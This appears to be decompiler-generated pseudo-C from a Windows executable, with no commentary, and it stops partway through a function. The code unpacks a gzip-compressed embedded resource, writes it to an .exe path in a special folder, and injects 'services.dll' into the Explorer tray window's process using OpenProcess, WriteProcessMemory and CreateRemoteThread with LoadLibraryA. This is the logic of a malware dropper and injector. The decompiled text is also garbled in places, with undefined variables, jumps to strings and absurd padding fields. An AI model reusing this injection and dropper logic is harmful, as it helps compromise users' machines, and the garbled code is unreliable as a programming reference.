
struct s0 {
    void* f0;
    signed char f1;
    signed char f2;
    unsigned char f3;
    int32_t f4;
    signed char[2] pad10;
    unsigned char fa;
};

int32_t CreateFileA = 0x227e;

int32_t WriteFile = 0x2272;

int32_t CloseHandle = 0x2264;

int32_t fun_401000(struct s0* ecx, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6) {
    int32_t eax7;
    void* v8;
    int32_t eax9;

    eax7 = reinterpret_cast<int32_t>(CreateFileA());
    if (eax7) {
        v8 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4 - 4);
        WriteFile(eax7, a2, a4, v8, 0);
        CloseHandle(eax7, eax7, a2, a4, v8, 0);
        eax9 = 0;
    } else {
        eax9 = eax7 + 1;
    }
    return eax9;
}

int32_t IsWindow = 0x2422;

int32_t GetWindowThreadProcessId = 0x2406;

int32_t OpenProcess = 0x2332;

int32_t VirtualAllocEx = 0x2320;

int32_t WriteProcessMemory = 0x230a;

int32_t GetModuleHandleA = 0x22ce;

int32_t GetProcAddress = 0x22f8;

int32_t CreateRemoteThread = 0x22e2;

int32_t fun_4010c3(int32_t a1, signed char* a2) {
    void* ebp3;
    signed char* eax4;
    int32_t v5;
    int32_t ebx6;
    int32_t v7;
    int32_t esi8;
    int32_t v9;
    int32_t edi10;
    int32_t edx11;
    int32_t eax12;
    int32_t v13;
    int32_t eax14;
    int32_t eax15;
    int32_t eax16;
    int32_t esi17;
    int32_t eax18;
    int32_t eax19;

    ebp3 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4);
    eax4 = a2;
    v5 = ebx6;
    v7 = esi8;
    v9 = edi10;
    edx11 = reinterpret_cast<int32_t>(eax4 + 1);
    do {
        ++eax4;
    } while (*eax4);
    eax12 = reinterpret_cast<int32_t>(IsWindow(a1, v9, v7, v5));
    if (eax12) {
        GetWindowThreadProcessId(a1, reinterpret_cast<int32_t>(ebp3) - 4, a1, v9, v7, v5);
    }
    eax14 = reinterpret_cast<int32_t>(OpenProcess(0x1f0fff, 0, v13, a1, v9, v7, v5));
    eax15 = reinterpret_cast<int32_t>(VirtualAllocEx(eax14, 0, reinterpret_cast<int32_t>(eax4) - edx11, 0x3000, 4, 0x1f0fff, 0, v13, a1, v9, v7, v5));
    eax16 = reinterpret_cast<int32_t>(WriteProcessMemory());
    if (eax16) {
        esi17 = GetModuleHandleA;
        eax18 = reinterpret_cast<int32_t>(esi17("KERNEL32.DLL"));
        if (!eax18) {
            eax18 = reinterpret_cast<int32_t>(esi17("kernel32.dll", "KERNEL32.DLL"));
        }
        eax19 = reinterpret_cast<int32_t>(GetProcAddress(eax18, "LoadLibraryA", eax15, 0, 0, "KERNEL32.DLL"));
        CreateRemoteThread(eax14, 0, 0, eax19, eax18, "LoadLibraryA", eax15, 0, 0, "KERNEL32.DLL");
    }
    return eax16;
}

struct s0* fun_401560(struct s0* ecx);

int32_t SHGetSpecialFolderLocation = 0x2476;

int32_t SHGetPathFromIDListA = 0x245e;

int32_t CoTaskMemFree = 0x24b0;

struct s1 {
    void* f0;
    signed char f1;
};

void* g4020f0 = reinterpret_cast<void*>(92);

struct s0* fun_401549(struct s0* a1);

void* g4020e0 = reinterpret_cast<void*>(0x73);

struct s2 {
    int32_t f0;
    int32_t f4;
};

int32_t g4020e4 = 0x73656369;

struct s3 {
    int32_t f0;
    signed char f4;
};

int32_t g4020e8 = 0x6578652e;

signed char g4020ec = 0;

void fun_401536(struct s0* ecx, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, struct s0* a8, struct s0* a9, struct s0* a10, struct s0* a11, struct s0* a12, struct s0* a13, struct s0* a14, struct s0* a15, struct s0* a16, struct s0* a17);

struct s0* fun_401197(struct s0* ecx, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6) {
    struct s0* v7;
    struct s0* v8;
    struct s0* ebp9;
    struct s0* v10;
    struct s0* v11;
    struct s0* v12;
    struct s0* ebx13;
    struct s0* eax14;
    struct s0* ebx15;
    struct s0* ecx16;
    struct s0* v17;
    struct s0* esi18;
    struct s0* v19;
    struct s0* edi20;
    struct s0* v21;
    struct s0* v22;
    int32_t eax23;
    struct s0* v24;
    struct s0* v25;
    int32_t eax26;
    struct s0* v27;
    struct s1* edi28;
    struct s0* eax29;
    signed char* esi30;
    struct s0* eax31;
    struct s0* eax32;
    struct s0* edx33;
    struct s2* edi34;
    struct s3* edi35;
    struct s0* eax36;
    struct s0* eax37;
    struct s0* eax38;
    struct s0* ebx39;
    struct s0* eax40;
    struct s0* edx41;
    void* eax42;
    struct s1* edi43;
    struct s0* v44;
    uint32_t ecx45;
    struct s0* esi46;
    struct s0* ecx47;

    v7 = reinterpret_cast<struct s0*>(__return_address());
    v8 = ebp9;
    v10 = ecx;
    v11 = ecx;
    v12 = ebx13;
    eax14 = fun_401560(ecx);
    ebx15 = eax14;
    ecx16 = reinterpret_cast<struct s0*>(0x105);
    if (!ebx15) {
        addr_40129f_2:
        return eax14;
    } else {
        v17 = esi18;
        v19 = edi20;
        v21 = reinterpret_cast<struct s0*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4 - 4);
        v22 = a2;
        eax23 = reinterpret_cast<int32_t>(SHGetSpecialFolderLocation(0x105));
        if (eax23) 
            goto addr_40121f_4;
        v24 = ebx15;
        v25 = v10;
        eax26 = reinterpret_cast<int32_t>(SHGetPathFromIDListA(0x105, v25));
        if (!eax26) 
            goto addr_40121f_4;
        v27 = v10;
        CoTaskMemFree(0x105, v27, v25);
        edi28 = reinterpret_cast<struct s1*>(reinterpret_cast<uint32_t>(ebx15) - 1);
        do {
            edi28 = reinterpret_cast<struct s1*>(&edi28->f1);
        } while (edi28->f1);
        eax29 = ebx15;
        edi28->f0 = g4020f0;
        esi30 = &eax29->f1;
        do {
            eax29 = reinterpret_cast<struct s0*>(&eax29->f1);
        } while (eax29->f0);
        eax31 = fun_401549(ebx15);
        ebx15 = eax31;
        if (ebx15) 
            goto addr_40120e_14;
    }
    addr_401265_15:
    eax14 = reinterpret_cast<struct s0*>(0);
    addr_40129d_16:
    goto addr_40129f_2;
    addr_40120e_14:
    eax32 = fun_401560(reinterpret_cast<uint32_t>(eax29) - reinterpret_cast<uint32_t>(esi30) + 1);
    edx33 = eax32;
    ecx16 = reinterpret_cast<struct s0*>(13);
    v11 = edx33;
    if (edx33) {
        edx33->f0 = g4020e0;
        edi34 = reinterpret_cast<struct s2*>(&edx33->f4);
        edi34->f0 = g4020e4;
        edi35 = reinterpret_cast<struct s3*>(&edi34->f4);
        edi35->f0 = g4020e8;
        eax36 = ebx15;
        edi35->f4 = g4020ec;
        do {
            eax36 = reinterpret_cast<struct s0*>(&eax36->f1);
        } while (eax36->f0);
        eax37 = edx33;
        do {
            eax37 = reinterpret_cast<struct s0*>(&eax37->f1);
        } while (eax37->f0);
        eax38 = fun_401549(ebx15);
        ebx39 = eax38;
        if (!ebx39) 
            goto addr_401265_15;
    } else {
        addr_40121f_4:
        fun_401536(ecx16, ebx15, 0, v22, v21, v19, v17, v12, v11, v10, v8, v7, a2, a3, a4, a5, a6);
        eax14 = reinterpret_cast<struct s0*>(0);
        goto addr_40129c_34;
    }
    eax40 = v11;
    edx41 = eax40;
    do {
        eax40 = reinterpret_cast<struct s0*>(&eax40->f1);
    } while (eax40->f0);
    eax42 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(eax40) - reinterpret_cast<uint32_t>(edx41));
    edi43 = reinterpret_cast<struct s1*>(reinterpret_cast<uint32_t>(ebx39) - 1);
    do {
        edi43 = reinterpret_cast<struct s1*>(&edi43->f1);
    } while (edi43->f1);
    v44 = v11;
    ecx45 = reinterpret_cast<uint32_t>(eax42) >> 2;
    esi46 = edx41;
    while (ecx45) {
        --ecx45;
        edi43->f0 = esi46->f0;
        edi43 = edi43 + 2;
        esi46 = reinterpret_cast<struct s0*>(&esi46->f4);
    }
    ecx47 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(eax42) & 3);
    while (ecx47) {
        ecx47 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(ecx47) - 1);
        edi43->f0 = esi46->f0;
        edi43 = reinterpret_cast<struct s1*>(&edi43->f1);
        esi46 = reinterpret_cast<struct s0*>(&esi46->f1);
    }
    fun_401536(ecx47, v44, v27, v25, v24, 0, v22, v21, v19, v17, v12, v11, v10, v8, v7, a2, a3);
    eax14 = ebx39;
    addr_40129c_34:
    goto addr_40129d_16;
}

int32_t g4030e0 = 0;

int32_t HeapReAlloc = 0x239a;

struct s0* fun_401549(struct s0* a1) {
    int32_t v2;

    v2 = g4030e0;
    HeapReAlloc();
    goto v2;
}

int32_t HeapAlloc = 0x23a8;

struct s0* fun_401560(struct s0* ecx) {
    int32_t v2;

    v2 = g4030e0;
    HeapAlloc();
    goto v2;
}

int32_t HeapFree = 0x238e;

void fun_401536(struct s0* ecx, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, struct s0* a8, struct s0* a9, struct s0* a10, struct s0* a11, struct s0* a12, struct s0* a13, struct s0* a14, struct s0* a15, struct s0* a16, struct s0* a17) {
    int32_t v18;

    v18 = g4030e0;
    HeapFree();
    goto v18;
}

int32_t FindResourceA = 0x22be;

int32_t LoadResource = 0x22ae;

int32_t LockResource = 0x229e;

int32_t SizeofResource = 0x228c;

struct s0* fun_4014be(struct s0* ecx, struct s0* a2, void* a3, struct s0* a4, struct s0* a5, struct s0* a6);

signed char* fun_401048(struct s0* ecx, struct s0* a2) {
    struct s0* edi3;
    struct s0* esi4;
    struct s0* ebx5;
    struct s0* eax6;
    struct s0* eax7;
    struct s0* eax8;
    struct s0* eax9;
    void* eax10;
    struct s0* ecx11;
    struct s0* eax12;
    signed char* eax13;
    signed char* v14;

    eax6 = reinterpret_cast<struct s0*>(GetModuleHandleA(0, edi3, esi4, ebx5));
    eax7 = reinterpret_cast<struct s0*>(FindResourceA(eax6, 1, 10, 0, edi3, esi4, ebx5));
    eax8 = reinterpret_cast<struct s0*>(LoadResource());
    eax9 = reinterpret_cast<struct s0*>(LockResource());
    if (eax9) {
        eax10 = reinterpret_cast<void*>(SizeofResource(eax6, eax7));
        if (eax10) {
            ecx11 = reinterpret_cast<struct s0*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4 - 4);
            eax12 = fun_4014be(ecx11, eax9, eax10, ecx11, eax6, eax7);
            if (eax12) {
                fun_401000(ecx11, eax12, a2, ecx, eax6, eax7);
                fun_401536(ecx11, eax12, eax12, a2, ecx, eax6, eax7, eax8, eax6, eax7, eax6, 1, 10, 0, edi3, esi4, ebx5);
                eax13 = reinterpret_cast<signed char*>(0);
            } else {
                v14 = reinterpret_cast<signed char*>(3);
                goto addr_4010a4_6;
            }
        } else {
            v14 = reinterpret_cast<signed char*>(2);
            goto addr_4010a4_6;
        }
    } else {
        eax13 = &eax9->f1;
    }
    addr_4010be_9:
    return eax13;
    addr_4010a4_6:
    eax13 = v14;
    goto addr_4010be_9;
}

int32_t FindWindowA = 0x2444;

int32_t GetForegroundWindow = 0x242e;

void fun_401172(struct s0* ecx) {
    int32_t eax2;

    eax2 = reinterpret_cast<int32_t>(FindWindowA());
    if (!eax2) {
        eax2 = reinterpret_cast<int32_t>(GetForegroundWindow());
    }
    fun_4010c3(eax2, "services.dll");
    goto "Shell_TrayWnd";
}

int32_t ShellExecuteA = 0x2494;

void fun_4014a6() {
    ShellExecuteA();
    goto 0;
}

struct s4 {
    unsigned char f0;
    unsigned char f1;
};

uint32_t fun_401f90(struct s0* a1, void* a2);

int32_t fun_401e90(struct s0* a1, void** a2, struct s4* a3, uint32_t a4);

uint32_t fun_401710(struct s0* a1, void** a2, struct s0* a3, void* a4) {
    struct s0* esi5;
    unsigned char al6;
    struct s4* ebp7;
    uint32_t edi8;
    uint32_t eax9;
    uint32_t eax10;
    uint32_t edi11;
    uint32_t edx12;
    uint32_t ecx13;
    uint32_t ecx14;
    void* edi15;
    uint32_t ebx16;
    int32_t eax17;
    uint32_t eax18;
    int32_t ecx19;

    esi5 = a3;
    if (!reinterpret_cast<int1_t>(esi5->f0 == 31) || (esi5->f1 != 0x8b || (esi5->f2 != 8 || (al6 = esi5->f3, !!(al6 & 0xe0))))) {
        return 0xfffffffd;
    } else {
        ebp7 = reinterpret_cast<struct s4*>(&esi5->fa);
        if (al6 & 4) {
            ebp7 = reinterpret_cast<struct s4*>(ebp7->f0 + reinterpret_cast<uint32_t>(ebp7) + (static_cast<uint32_t>(ebp7->f1) << 8) + 2);
        }
        if (al6 & 8) {
            if (ebp7->f0) {
                do {
                    ebp7 = reinterpret_cast<struct s4*>(&ebp7->f1);
                } while (ebp7->f1);
            }
            ebp7 = reinterpret_cast<struct s4*>(&ebp7->f1);
        }
        if (al6 & 16) {
            if (ebp7->f0) {
                do {
                    ebp7 = reinterpret_cast<struct s4*>(&ebp7->f1);
                } while (ebp7->f1);
            }
            ebp7 = reinterpret_cast<struct s4*>(&ebp7->f1);
        }
        if (al6 & 2) {
            edi8 = ebp7->f1;
            eax9 = ebp7->f0;
            eax10 = fun_401f90(esi5, reinterpret_cast<uint32_t>(ebp7) - reinterpret_cast<uint32_t>(esi5));
            if ((edi8 << 8) + eax9 == (eax10 & 0xffff)) {
                ++ebp7;
            } else {
                return 0xfffffffd;
            }
        }
        edi11 = *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(esi5) + reinterpret_cast<int32_t>(a4) - 1);
        edx12 = *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(esi5) + reinterpret_cast<int32_t>(a4) - 2);
        ecx13 = *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(esi5) + reinterpret_cast<int32_t>(a4) - 3);
        ecx14 = *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(esi5) + reinterpret_cast<int32_t>(a4) - 8);
        edi15 = reinterpret_cast<void*>((((edi11 << 8) + edx12 << 8) + ecx13 << 8) + *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(esi5) + reinterpret_cast<int32_t>(a4) - 4));
        ebx16 = ((static_cast<uint32_t>(*reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(esi5) + reinterpret_cast<int32_t>(a4) - 5)) << 8) + *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(esi5) + reinterpret_cast<int32_t>(a4) - 6) << 8) + *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(esi5) + reinterpret_cast<int32_t>(a4) - 7);
        eax17 = fun_401e90(a1, a2, ebp7, reinterpret_cast<uint32_t>(esi5) - reinterpret_cast<uint32_t>(ebp7) + reinterpret_cast<int32_t>(a4) - 8);
        if (eax17 || *a2 != edi15) {
            return 0xfffffffd;
        } else {
            eax18 = fun_401f90(a1, edi15);
            ecx19 = 0;
            *reinterpret_cast<unsigned char*>(&ecx19) = reinterpret_cast<uint1_t>((ebx16 << 8) + ecx14 == eax18);
            return reinterpret_cast<uint32_t>(ecx19 - 1) & 0xfffffffd;
        }
    }
}

uint32_t fun_401f90(struct s0* a1, void* a2) {
    void* edx3;
    uint32_t eax4;
    void* ecx5;
    struct s0* esi6;
    uint32_t eax7;
    uint32_t eax8;

    edx3 = a2;
    eax4 = 0xffffffff;
    if (edx3) {
        ecx5 = reinterpret_cast<void*>(0);
        if (edx3) {
            esi6 = a1;
            do {
                eax7 = eax4 ^ static_cast<uint32_t>(*reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(ecx5) + reinterpret_cast<uint32_t>(esi6)));
                eax8 = eax7 >> 4 ^ *reinterpret_cast<uint32_t*>((eax7 & 15) * 4 + 0x402130);
                eax4 = eax8 >> 4 ^ *reinterpret_cast<uint32_t*>((eax8 & 15) * 4 + 0x402130);
                ecx5 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(ecx5) + 1);
            } while (reinterpret_cast<uint32_t>(ecx5) < reinterpret_cast<uint32_t>(edx3));
        }
        return ~eax4;
    } else {
        return 0;
    }
}

struct s5 {
    uint16_t f0;
    signed char[4202774] pad4202776;
    unsigned char f402118;
};

struct s6 {
    signed char[8] pad8;
    int32_t f8;
};

struct s7 {
    signed char[8] pad8;
    int32_t f8;
};

struct s8 {
    signed char[4] pad4;
    uint32_t f4;
};

struct s9 {
    signed char[8] pad8;
    int32_t f8;
};

struct s10 {
    signed char[4] pad4;
    uint32_t f4;
};

struct s11 {
    signed char[4] pad4;
    uint32_t f4;
};

struct s5* fun_4019d0(struct s5* ecx, struct s5* a2, struct s5* a3, struct s5* a4) {
    void* ebx5;
    void* edi6;
    void* esi7;
    int1_t zf8;
    struct s6* edx9;
    struct s7* edx10;
    int32_t eax11;
    unsigned char** edx12;
    struct s8* edx13;
    int32_t* edx14;
    struct s9* edx15;
    int1_t zf16;
    struct s10* edx17;
    struct s11* edx18;

    ebx5 = reinterpret_cast<void*>(0);
    if (!ecx) {
        return &a2->f0;
    } else {
        edi6 = reinterpret_cast<void*>(1 << *reinterpret_cast<unsigned char*>(&ecx));
        esi7 = reinterpret_cast<void*>(1);
        if (reinterpret_cast<uint32_t>(edi6) <= 1) {
            return &a2->f0;
        } else {
            do {
                zf8 = edx9->f8 == 0;
                edx10->f8 = edx9->f8 - 1;
                if (zf8) {
                    eax11 = reinterpret_cast<int32_t>(*edx12 + 1);
                    edx13->f4 = **edx12;
                    *edx14 = eax11;
                    edx15->f8 = 7;
                }
                zf16 = (edx17->f4 & 1) == 0;
                edx18->f4 = edx17->f4 >> 1;
                if (!zf16) {
                    ebx5 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(ebx5) + reinterpret_cast<uint32_t>(esi7));
                }
                esi7 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi7) + reinterpret_cast<uint32_t>(esi7));
            } while (reinterpret_cast<uint32_t>(esi7) < reinterpret_cast<uint32_t>(edi6));
            return reinterpret_cast<uint32_t>(ebx5) + reinterpret_cast<uint32_t>(a2);
        }
    }
}

struct s12 {
    struct s5* f0;
    struct s5* f4;
    struct s5* f8;
    struct s5* fc;
    struct s5* f10;
    struct s5* f14;
    struct s5* f18;
    struct s5* f1c;
};

void fun_401930(struct s5* ecx, struct s5* a2, struct s5* a3, ...) {
    struct s5* eax4;
    struct s12* edx5;
    void* esp6;
    struct s5* esi7;
    uint32_t ecx8;
    void* edi9;
    int16_t* edx10;
    int16_t* edx11;
    void* esp12;
    uint32_t ecx13;
    void* esp14;
    int16_t* edx15;
    uint16_t* eax16;
    uint16_t* edx17;
    int32_t esi18;
    int32_t edx19;
    int32_t ebx20;
    uint32_t ebp21;
    struct s5* esi22;
    struct s5* eax23;
    void* esp24;
    void* edi25;
    void* edx26;
    uint32_t ecx27;
    void* edi28;

    eax4 = reinterpret_cast<struct s5*>(0);
    edx5->f0 = reinterpret_cast<struct s5*>(0);
    edx5->f4 = reinterpret_cast<struct s5*>(0);
    edx5->f8 = reinterpret_cast<struct s5*>(0);
    edx5->fc = reinterpret_cast<struct s5*>(0);
    edx5->f10 = reinterpret_cast<struct s5*>(0);
    edx5->f14 = reinterpret_cast<struct s5*>(0);
    esp6 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 32 - 4);
    esi7 = a2;
    edx5->f18 = reinterpret_cast<struct s5*>(0);
    edx5->f1c = reinterpret_cast<struct s5*>(0);
    if (esi7) {
        do {
            ecx8 = *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax4) + reinterpret_cast<uint32_t>(edi9));
            edx10[ecx8] = reinterpret_cast<int16_t>(edx11[ecx8] + 1);
            eax4 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(eax4) + 1);
        } while (reinterpret_cast<uint32_t>(eax4) < reinterpret_cast<uint32_t>(esi7));
    }
    esp12 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp6) - 4);
    ecx13 = 0;
    esp14 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp12) - 4);
    *edx15 = 0;
    eax16 = edx17;
    esi18 = reinterpret_cast<int32_t>(esp12) + 8 - edx19;
    ebx20 = 16;
    do {
        ebp21 = *eax16;
        *reinterpret_cast<int16_t*>(esi18 + reinterpret_cast<int32_t>(eax16)) = *reinterpret_cast<int16_t*>(&ecx13);
        ecx13 = ecx13 + ebp21;
        ++eax16;
        --ebx20;
    } while (ebx20);
    esi22 = a2;
    eax23 = reinterpret_cast<struct s5*>(0);
    esp24 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp14) + 4 + 4);
    if (esi22) {
        do {
            if (*reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax23) + reinterpret_cast<uint32_t>(edi25))) {
                *reinterpret_cast<int16_t*>(reinterpret_cast<int32_t>(edx26) + *reinterpret_cast<uint16_t*>(reinterpret_cast<int32_t>(esp24) + *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax23) + reinterpret_cast<uint32_t>(edi25)) * 2 + 4) * 2 + 32) = *reinterpret_cast<int16_t*>(&eax23);
                ecx27 = *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(eax23) + reinterpret_cast<uint32_t>(edi28));
                *reinterpret_cast<int16_t*>(reinterpret_cast<int32_t>(esp24) + ecx27 * 2 + 4) = reinterpret_cast<int16_t>(*reinterpret_cast<int16_t*>(reinterpret_cast<int32_t>(esp24) + ecx27 * 2 + 4) + 1);
            }
            eax23 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(eax23) + 1);
        } while (reinterpret_cast<uint32_t>(eax23) < reinterpret_cast<uint32_t>(esi22));
    }
    return;
}

struct s13 {
    signed char[4206848] pad4206848;
    unsigned char f403100;
};

struct s13* fun_401a50(struct s5* ecx, struct s5* a2, struct s5* a3);

void fun_401ab0(struct s5* a1, struct s5* a2, struct s4* a3) {
    struct s5* v4;
    struct s5* esi5;
    struct s5* v6;
    struct s5* edi7;
    struct s5* eax8;
    struct s5* ebx9;
    struct s5* v10;
    struct s5* eax11;
    struct s5* ecx12;
    struct s5* v13;
    struct s5* eax14;
    void* esp15;
    struct s5* esi16;
    struct s5* edi17;
    struct s5* eax18;
    void* eax19;
    void* esp20;
    void* esi21;
    void* v22;
    struct s13* eax23;
    void* ecx24;
    struct s5* eax25;
    struct s5* edx26;
    uint32_t ecx27;
    unsigned char* edi28;
    unsigned char eax29;
    void* ecx30;
    struct s5* eax31;
    struct s5* edx32;
    uint32_t ecx33;
    signed char* edi34;
    struct s5* eax35;
    struct s5* edx36;
    uint32_t ecx37;
    signed char* edi38;

    v4 = esi5;
    v6 = edi7;
    eax8 = fun_4019d0(5, 0x101, v6, v4);
    ebx9 = eax8;
    v10 = ebx9;
    eax11 = fun_4019d0(5, 1, 0x101, v6);
    ecx12 = reinterpret_cast<struct s5*>(4);
    v13 = eax11;
    eax14 = fun_4019d0(4, 4, 1, 0x101);
    esp15 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 0x3b0 - 4 - 4 - 4 - 4 - 4 - 4 + 4 - 4 - 4 + 4 - 4 - 4 + 4 + 12);
    esi16 = reinterpret_cast<struct s5*>(0);
    if (eax14) {
        edi17 = eax14;
        do {
            eax18 = fun_4019d0(3, 0, v6, v4);
            ecx12 = reinterpret_cast<struct s5*>(static_cast<uint32_t>(esi16->f402118));
            esp15 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp15) - 4 - 4 + 4 + 4);
            esi16 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(esi16) + 1);
            *reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(esp15) + reinterpret_cast<uint32_t>(ecx12) + 32) = *reinterpret_cast<signed char*>(&eax18);
        } while (reinterpret_cast<uint32_t>(esi16) < reinterpret_cast<uint32_t>(edi17));
    }
    fun_401930(ecx12, 19, v6, ecx12, 19, v6);
    eax19 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(v13) + reinterpret_cast<uint32_t>(ebx9));
    esp20 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp15) - 4 - 4 + 4 + 4);
    esi21 = reinterpret_cast<void*>(0);
    v22 = eax19;
    if (eax19) {
        do {
            eax23 = fun_401a50(ecx12, reinterpret_cast<int32_t>(esp20) + 0x160, v6);
            esp20 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp20) - 4 - 4 + 4 + 4);
            ecx24 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(eax23) - 16);
            if (!ecx24) {
                *reinterpret_cast<signed char*>(&ebx9) = *reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(esp20) + reinterpret_cast<uint32_t>(esi21) + 31);
                ecx12 = reinterpret_cast<struct s5*>(2);
                eax25 = fun_4019d0(2, 3, v6, v4);
                esp20 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp20) - 4 - 4 + 4 + 4);
                if (eax25) {
                    *reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(&ebx9) + 1) = *reinterpret_cast<signed char*>(&ebx9);
                    edx26 = eax25;
                    ecx27 = reinterpret_cast<uint32_t>(eax25) >> 2;
                    edi28 = reinterpret_cast<unsigned char*>(reinterpret_cast<int32_t>(esp20) + reinterpret_cast<uint32_t>(esi21) + 32);
                    eax29 = reinterpret_cast<unsigned char>(reinterpret_cast<uint32_t>(ebx9) << 16);
                    *reinterpret_cast<int16_t*>(&eax29) = *reinterpret_cast<int16_t*>(&ebx9);
                    while (ecx27) {
                        --ecx27;
                        *edi28 = eax29;
                        edi28 = edi28 + 4;
                        esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + 4);
                    }
                    ecx12 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(edx26) & 3);
                    while (ecx12) {
                        ecx12 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(ecx12) - 1);
                        *edi28 = eax29;
                        ++edi28;
                        esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + 1);
                    }
                    esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + reinterpret_cast<uint32_t>(edx26));
                }
            } else {
                ecx30 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(ecx24) - 1);
                if (!ecx30) {
                    ecx12 = reinterpret_cast<struct s5*>(3);
                    eax31 = fun_4019d0(3, 3, v6, v4);
                    edx32 = eax31;
                    esp20 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp20) - 4 - 4 + 4 + 4);
                    if (edx32) {
                        ebx9 = edx32;
                        ecx33 = reinterpret_cast<uint32_t>(edx32) >> 2;
                        edi34 = reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(esp20) + reinterpret_cast<uint32_t>(esi21) + 32);
                        while (ecx33) {
                            --ecx33;
                            *edi34 = reinterpret_cast<signed char>(0);
                            edi34 = edi34 + 4;
                            esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + 4);
                        }
                        ecx12 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(ebx9) & 3);
                        while (ecx12) {
                            ecx12 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(ecx12) - 1);
                            *edi34 = 0;
                            ++edi34;
                            esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + 1);
                        }
                        esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + reinterpret_cast<uint32_t>(edx32));
                    }
                } else {
                    ecx12 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(ecx30) - 1);
                    if (!ecx12) {
                        ecx12 = reinterpret_cast<struct s5*>(7);
                        eax35 = fun_4019d0(7, 11, v6, v4);
                        edx36 = eax35;
                        esp20 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(esp20) - 4 - 4 + 4 + 4);
                        if (edx36) {
                            ebx9 = edx36;
                            ecx37 = reinterpret_cast<uint32_t>(edx36) >> 2;
                            edi38 = reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(esp20) + reinterpret_cast<uint32_t>(esi21) + 32);
                            while (ecx37) {
                                --ecx37;
                                *edi38 = reinterpret_cast<signed char>(0);
                                edi38 = edi38 + 4;
                                esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + 4);
                            }
                            ecx12 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(ebx9) & 3);
                            while (ecx12) {
                                ecx12 = reinterpret_cast<struct s5*>(reinterpret_cast<uint32_t>(ecx12) - 1);
                                *edi38 = 0;
                                ++edi38;
                                esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + 1);
                            }
                            esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + reinterpret_cast<uint32_t>(edx36));
                        }
                    } else {
                        *reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(esp20) + reinterpret_cast<uint32_t>(esi21) + 32) = *reinterpret_cast<signed char*>(&eax23);
                        esi21 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(esi21) + 1);
                    }
                }
            }
        } while (reinterpret_cast<uint32_t>(esi21) < reinterpret_cast<uint32_t>(v22));
        ebx9 = v10;
    }
    fun_401930(ecx12, ebx9, v6, ecx12, ebx9, v6);
    fun_401930(ecx12, v13, ebx9, ecx12, v13, ebx9);
    return;
}

struct s14 {
    signed char[12] pad12;
    signed char* fc;
    uint32_t* f10;
};

int32_t fun_401c90(struct s5* ecx, struct s5* a2, struct s5* a3, struct s5* a4, struct s4* a5) {
    struct s14* esi6;
    struct s14* eax7;
    signed char* eax8;
    signed char* v9;
    struct s5* esi10;
